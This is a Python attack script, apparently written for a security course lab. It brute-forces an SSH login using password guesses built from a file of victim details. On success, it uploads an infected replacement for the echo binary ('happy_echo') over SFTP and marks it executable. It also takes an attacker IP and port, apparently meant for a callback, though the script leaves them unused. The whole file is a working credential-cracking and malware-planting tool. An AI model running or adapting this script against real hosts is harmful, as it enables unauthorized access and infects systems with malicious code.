#!/usr/bin/env python3
import paramiko
import sys
from itertools import product
from time import sleep
import logging
logging.getLogger("paramiko").setLevel(logging.CRITICAL)


# crack password
def load_victim_info(path="/app/victim.dat"):
    with open(path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def generate_passwords(info, max_len=3):
    for i in range(1, max_len + 1):
        for combo in product(info, repeat=i):
            yield ''.join(combo)

def try_ssh(ip, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=username, password=password, timeout=10)
        client.close()
        return True
    except Exception as e:
        # print(f"[!] Authentication failed")
        return False

def crack_password(victim_ip, info_path="/app/victim.dat"):
    username = "csc2025"
    info = load_victim_info(info_path)
    print(f"[+] Loaded {len(info)} info entries from victim.dat")

    for pwd in generate_passwords(info, max_len=3):
        print(f"[-] Trying: {pwd}")
        if try_ssh(victim_ip, username, pwd):
            print(f"[+] Password found: {pwd}")
            return pwd
    print("[-] Password not found.")
    return None

# inject virus
# echo 67792
# $ stat -c%s /bin/echo
# $ gzip -c echo > echo.gz

def upload_file(ip, username, password, local_path, remote_path):
    try:
        transport = paramiko.Transport((ip, 22))
        transport.connect(username=username, password=password)
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.put(local_path, remote_path)
        sftp.close()
        transport.close()
        print(f"[+] Uploaded {local_path} to {remote_path}")
    except Exception as e:
        print(f"[!] Upload failed: {e}")

def run_remote_command(ip, username, password, command):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip, username=username, password=password, timeout=5)
    stdin, stdout, stderr = ssh.exec_command(command)
    print(stdout.read().decode())
    print(stderr.read().decode())
    ssh.close()

def infect_victim(ip, password):
    user = "csc2025"
    infected_path_local = "./happy_echo"
    infected_path_remote = "/app/echo"

    upload_file(ip, user, password, infected_path_local, infected_path_remote)
    run_remote_command(ip, user, password, "chmod +x /app/echo")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: ./crack_attack <Victim IP> <Attacker IP> <Attacker port>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = int(sys.argv[3])

    password = crack_password(victim_ip)
    if password:
        infect_victim(victim_ip, password)
